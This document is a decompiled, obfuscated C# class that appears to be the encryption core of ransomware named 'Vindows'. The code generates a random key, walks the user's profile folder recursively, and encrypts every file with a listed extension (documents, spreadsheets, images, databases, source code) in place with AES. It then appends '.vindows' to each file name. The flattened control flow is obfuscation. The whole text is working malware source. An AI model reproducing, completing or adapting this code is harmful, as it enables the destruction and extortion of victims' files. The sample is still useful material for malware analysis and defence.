using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Vindows.Engine.Utilities;

internal class Class4
{
	internal Class1 class1_0;

	internal string string_0;

	internal byte[] byte_0;

	internal int int_0 = 32;

	internal string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	internal string[] string_2 = new string[20]
	{
		".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
		".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
	};

	internal string string_3 = ".vindows";

	internal Class4(Class1 class1_1)
	{
		class1_0 = class1_1;
	}

	private void method_0()
	{
		while (true)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			int num = 353;
			int num2 = num;
			num = 353;
			int num3;
			switch (num2 == num)
			{
			case false:
			case true:
				num = 2;
				num3 = num;
				goto IL_0067;
			default:
				{
					if (0 == 0)
					{
					}
					num = 3;
					num3 = num;
					goto IL_0067;
				}
				IL_0067:
				while (true)
				{
					switch (num3)
					{
					case 3:
						if (true)
						{
						}
						goto case 0;
					case 0:
						num = 1;
						num3 = num;
						continue;
					case 1:
						break;
					default:
						goto end_IL_0067;
					case 2:
						num = 0;
						string_0 = stringBuilder.ToString();
						byte_0 = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(string_0));
						return;
					}
					if (0 < int_0--)
					{
						stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
						num = 0;
						num3 = num;
						continue;
					}
					goto case false;
					continue;
					end_IL_0067:
					break;
				}
				break;
			}
		}
	}

	private void method_1(string string_4)
	{
		switch (0)
		{
		}
		string text = default(string);
		string string_5 = default(string);
		while (true)
		{
			string[] array = Directory.GetFiles(string_4);
			int num = 0;
			int num2 = 0;
			num2 = 4;
			int num3 = num2;
			while (true)
			{
				if (1 == 0)
				{
				}
				switch (num3)
				{
				case 2:
					try
					{
						method_2(text);
					}
					catch
					{
					}
					goto IL_01b0;
				case 0:
				case 4:
					num2 = 9;
					num3 = num2;
					continue;
				case 5:
					if (string_2.Contains<string>(Path.GetExtension(text)))
					{
						num2 = 2;
						num3 = num2;
						continue;
					}
					goto IL_01b0;
				case 6:
					if (num >= array.Length)
					{
						num2 = 1;
						num3 = num2;
					}
					else
					{
						string_5 = array[num];
						num2 = 7;
						num3 = num2;
					}
					continue;
				case 7:
					try
					{
						method_1(string_5);
					}
					catch
					{
					}
					num++;
					num2 = 3;
					num3 = num2;
					continue;
				case 8:
				{
					num2 = 30318;
					int num4 = num2;
					num2 = 30318;
					switch (num4 == num2)
					{
					default:
						if (0 == 0)
						{
						}
						array = Directory.GetDirectories(string_4);
						num = 0;
						break;
					case false:
					case true:
						break;
					}
					num2 = 10;
					num3 = num2;
					continue;
				}
				case 9:
					if (num >= array.Length)
					{
						num2 = 8;
						num3 = num2;
					}
					else
					{
						text = array[num];
						num2 = 5;
						num3 = num2;
					}
					continue;
				case 3:
				case 10:
					num2 = 6;
					num3 = num2;
					continue;
				case 1:
					return;
					IL_01b0:
					num++;
					num2 = 0;
					num3 = num2;
					continue;
				}
				break;
			}
		}
	}

	private void method_2(string string_4)
	{
		int num = -6165;
		int num2 = num;
		num = -6165;
		switch (num2 == num)
		{
		}
		if (0 == 0)
		{
		}
		if (1 == 0)
		{
		}
		num = 0;
		byte[] array = File.ReadAllBytes(string_4);
		File.WriteAllBytes(string_4, AES.smethod_0(array, byte_0));
		File.Move(string_4, string_4 + string_3);
	}

	[AsyncStateMachine(typeof(Struct1))]
	private void method_3()
	{
		int num = 6505;
		int num2 = num;
		num = 6505;
		switch (num2 == num)
		{
		}
		if (1 == 0)
		{
		}
		if (0 == 0)
		{
		}
		num = 0;
		Struct1 stateMachine = default(Struct1);
		stateMachine.class4_0 = this;
		stateMachine.asyncVoidMethodBuilder_0 = AsyncVoidMethodBuilder.Create();
		stateMachine.int_0 = -1;
		AsyncVoidMethodBuilder asyncVoidMethodBuilder_ = stateMachine.asyncVoidMethodBuilder_0;
		asyncVoidMethodBuilder_.Start(ref stateMachine);
	}

	internal void method_4()
	{
		int num = -13896;
		int num2 = num;
		num = -13896;
		switch (num2 == num)
		{
		}
		if (0 == 0)
		{
		}
		if (1 == 0)
		{
		}
		num = 0;
		method_0();
		method_1(string_1);
		method_3();
	}
}
